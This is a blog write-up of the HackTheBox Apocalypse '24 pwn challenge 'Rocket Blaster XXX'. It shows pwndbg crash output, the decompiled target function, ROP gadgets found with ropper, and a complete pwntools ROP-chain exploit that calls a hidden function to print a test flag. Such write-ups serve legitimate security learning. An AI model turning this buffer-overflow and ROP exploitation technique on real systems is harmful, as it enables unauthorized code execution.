---
layout: post
title: "pwn rocketblasterxxx"
date: 2024-03-14 17:18:49 -0700
categories: ctfs
description: The "Rocket Blaster XXX" challenge involves exploiting a buffer overflow vulnerability to load specific values into memory addresses, ultimately calling an uncalled function with predefined parameters.
parent: HackTheBox - Apocalypse '24
grand_parent: CTF Events
event: "hackthebox-apocalypse"
tags:
- "pwn"
- "buffer overflow"
- "exploitation"
- "reverse engineering"
- "memory manipulation"
---

## Rocket Blaster XXX - Pwn Challenge

The "Rocket Blaster XXX" challenge presents participants with a prompt featuring a cute dog and a gun, hinting at the need to load ammo into a specific spot. Upon analysis using Ghidra, an uncalled function requiring three parameters: "0xdeadbeef," "0xdeadbabe," and "0xdead1337" is identified. These parameters must be passed in a specific order, indicating a memory manipulation challenge.

### Exploiting the Vulnerability:
To exploit the challenge, participants delve into the function's code, locate its pointer, and ensure memory stability for remote execution. By leveraging a buffer overflow vulnerability discovered using the `cyclic` tool in Pwntools, participants prepare to overwrite memory addresses with desired values. 

#### Cyclic Generation
`cyclic 1000`

#### Buffer Overflow
```sh
0x0000000000401588 in main ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]───────────────────────────────────────────────────
 RAX  0x0
 RBX  0x0
*RCX  0x7ffff7d14887 (write+23) ◂— cmp rax, -01000h /* 'H=' */
*RDX  0x1
*RDI  0x7ffff7e1ca70 ◂— 0x0
*RSI  0x1
 R8   0x0
*R9   0x7fffffff
*R10  0x403ad8 ◂— '\nPrepare for trouble and make it double, or triple..\n\nYou need to place the ammo in the right place to load the Rocket Blaster XXX!\n\n>> '
*R11  0x246
*R12  0x7fffffffdc88 —▸ 0x7fffffffe002 ◂— '/home/tokugero/ctf/htb/rooms/event/apocalypse2024/pwn/rocketblasterxxx/challenge/rocket_blaster_xxx'
*R13  0x4014fa (main) ◂— endbr64 
*R14  0x404d78 (__do_global_dtors_aux_fini_array_entry) —▸ 0x401240 (__do_global_dtors_aux) ◂— endbr64 
*R15  0x7ffff7ffd040 (_rtld_global) —▸ 0x7ffff7ffe2e0 ◂— 0x0
*RBP  0x6161616161616165 ('eaaaaaaa')
*RSP  0x7fffffffdb78 ◂— 'faaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaa' #< LOOKING FOR FIRST 8 BYTES THAT ARE OVERFLOWED
*RIP  0x401588 (main+142) ◂— ret 
───────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]────────────────────────────────────────────────────────────
 ► 0x401588 <main+142>    ret    <0x6161616161616166>










─────────────────────────────────────────────────────────────────────────[ STACK ]─────────────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7fffffffdb78 ◂— 'faaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaa'
01:0008│     0x7fffffffdb80 ◂— 'gaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaa'
02:0010│     0x7fffffffdb88 ◂— 'haaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaa'
03:0018│     0x7fffffffdb90 ◂— 'iaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaa'
04:0020│     0x7fffffffdb98 ◂— 'jaaaaaaakaaaaaaalaaaaaaamaaaaa'
05:0028│     0x7fffffffdba0 ◂— 'kaaaaaaalaaaaaaamaaaaa'
06:0030│     0x7fffffffdba8 ◂— 'laaaaaaamaaaaa'
07:0038│     0x7fffffffdbb0 ◂— 0x61616161616d /* 'maaaaa' */
───────────────────────────────────────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────────────────────────────────────
 ► 0         0x401588 main+142
   1 0x6161616161616166
   2 0x6161616161616167
   3 0x6161616161616168
   4 0x6161616161616169
   5 0x616161616161616a
   6 0x616161616161616b
   7 0x616161616161616c
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

#### Identifying the overflow location
```sh
pwndbg> cyclic -l faaaaaaa       #< -- FIRST 8 BYTES THAT ARE OVERFLOWED                                               
Finding cyclic pattern of 8 bytes: b'faaaaaaa' (hex: 0x6661616161616161)
Found at offset 40
```
#### Identifying the addresses needed for the function
This is needed to tell the RSP register where the next instruction is, to overwrite the next return code to where you want it to go (in this case, our FillAmmo function)
![alt text](../../../assets/images/ctf/events/hackthebox-apocolypse-24/2024-03-14-pwn-rocketblasterxxx.md/2024-03-14-pwn-rocketblasterxxx/image.png)
```c
void fill_ammo(long param_1,long param_2,long param_3)

{
  ssize_t sVar1;
  char local_d;
  int local_c;
  
  local_c = open("./flag.txt",0);
  if (local_c < 0) {
    perror("\nError opening flag.txt, please contact an Administrator.\n");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  if (param_1 != 0xdeadbeef) { // < -- PARAMETER 1
    printf("%s[x] [-] [-]\n\n%sPlacement 1: %sInvalid!\n\nAborting..\n",&DAT_00402010,&DAT_00402008,
           &DAT_00402010);
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  if (param_2 != 0xdeadbabe) { // < -- PARAMETER 2
    printf(&DAT_004020c0,&DAT_004020b6,&DAT_00402010,&DAT_00402008,&DAT_00402010);
                    /* WARNING: Subroutine does not return */
    exit(2);
  }
  if (param_3 != 0xdead1337) { // < -- PARAMETER 3
    printf(&DAT_00402100,&DAT_004020b6,&DAT_00402010,&DAT_00402008,&DAT_00402010);
                    /* WARNING: Subroutine does not return */
    exit(3);
  }
  printf(&DAT_00402140,&DAT_004020b6);
  fflush(stdin);
  fflush(stdout);
  while( true ) {
    sVar1 = read(local_c,&local_d,1); // <-- reads in the flag
    if (sVar1 < 1) break;
    fputc((int)local_d,stdout); // <-- Put out that flag!
  }
  close(local_c);
  fflush(stdin);
  fflush(stdout);
  return;
}
```
Address where the function is located:
![alt text](../../../assets/images/ctf/events/hackthebox-apocolypse-24/2024-03-14-pwn-rocketblasterxxx.md/2024-03-14-pwn-rocketblasterxxx/image-2.png)

> Note here that the variables are being listed as stored in RDI, RSI, and RDX; this means we need to write our parameters to these registers before we call the actual function.

#### Finding where to write the registers
The below query is searching explicitly for what I'm looking for for the purposes of the documentation, but it might be helfpul to be less prescriptive in the grep to have a wider view of potential register-filling options.
```sh
[10:59:07] tokugero :: pangolin  ➜  pwn/rocketblasterxxx/challenge » ropper -f target/rocket_blaster_xxx | grep -e rdi -e rdx -e rsi                   1 ↵
<snip>
0x000000000040159f: pop rdi; ret; 
0x000000000040159b: pop rdx; ret; 
<snip>
0x000000000040159d: pop rsi; ret; 
```

### Crafting the Payload:
Understanding the process enables participants to construct a payload that populates memory with the required parameters and directs execution flow to the targeted function. Leveraging the identified Rock chains, participants fill memory addresses with parameter values and orchestrate the call to the uncalled function.

#### Pwntools
```python
io = start()

fill_ammo_ptr = 0x4012f5
overflow_offset = b'A' * 40 # Found with cyclic pattern in pwndbg

# These need to be set in respective parameters per fill_ammo function
param1_dbeef = 0xdeadbeef
param2_dbabe = 0xdeadbabe
param3_dl117 = 0xdead1337
pop_rdi = 0x40159f
pop_rsi = 0x40159d
pop_rdx = 0x40159b

payload = b''
payload += overflow_offset
payload += p64(0x40101a)
payload += p64(pop_rdx)
payload += p64(param3_dl117)
payload += p64(pop_rsi)
payload += p64(param2_dbabe)
payload += p64(pop_rdi)
payload += p64(param1_dbeef)
payload += p64(fill_ammo_ptr)

print(len(payload), payload)
io.recvuntil(b'>> ')
io.sendline(payload)

io.interactive()
```

And the juicy bits:
```sh
[+] Starting local process './rocket_blaster_xxx': pid 538144
104 b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x1a\x10@\x00\x00\x00\x00\x00\x9b\x15@\x00\x00\x00\x00\x007\x13\xad\xde\x00\x00\x00\x00\x9d\x15@\x00\x00\x00\x00\x00\xbe\xba\xad\xde\x00\x00\x00\x00\x9f\x15@\x00\x00\x00\x00\x00\xef\xbe\xad\xde\x00\x00\x00\x00\xf5\x12@\x00\x00\x00\x00\x00'
[*] Switching to interactive mode

Preparing beta testing..
[✓] [✓] [✓]

All Placements are set correctly!

Ready to launch at: HTB{f4k3_fl4g_4_t35t1ng}
```

### Conclusion:
The "Rocket Blaster XXX" challenge highlights the significance of identifying and exploiting buffer overflow vulnerabilities for memory manipulation. By understanding the application's behavior and leveraging appropriate tools, participants can craft payloads to manipulate memory addresses effectively. This experience underscores the importance of meticulous analysis and exploitation techniques in pwn challenges.
